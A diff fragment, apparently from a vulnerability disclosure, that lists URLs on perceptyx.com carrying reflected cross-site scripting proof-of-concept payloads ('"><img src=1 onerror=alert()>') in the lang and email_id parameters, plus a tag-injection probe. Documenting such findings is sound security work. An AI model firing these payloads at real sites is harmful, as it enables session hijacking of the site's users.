@@ -15,6 +15,8 @@
 
 5 https://ondemand.perceptyx.com/odaon3x3survey/dc/?0=v7vhq&ac=6e77hrs2s7jf&api=lix9x&first=zgevz&holdShow=b7w8g&jqXHR=mmisl&jsonp=eb3xi&keydown=ef0kj&lang="><syjhor>&list_type=orgun&open=vmspr&params=df3n0&password=v6dqg&ptx-modal=pfmhr&query=ssbfd&redirect=uv759&resize=g53j3&size=z4axa&this=s24gi&tid=n92wm&true=t2qc2
 
+7 https://perceptyx.com/amdes239/dc/?ac=&lang=xxx"><img src=1 onerror=alert()>\
 
 
+8 https://www.perceptyx.com/amdes239/dc/?action=je9c5&api=ils9b&c=orsbf&categoryid=aa3e7&csrf_token=wbxhj&email_id=21"> <img src=1 onerror=alert()> &emerge_id=40914&id=mjvuj&jsonp=qu8nm&key=fbr23&lang=zh&list_type=g5bnz&m=tbaaa&page=aemgx&password=n02g7&q=og8fg&redirect=qjbig&region=j93b0&rm=translate_email&s=h70pq&token=n29p7&unsubscribe_token=gjsvw&view=dz8ym&year=ddxa8
 ```
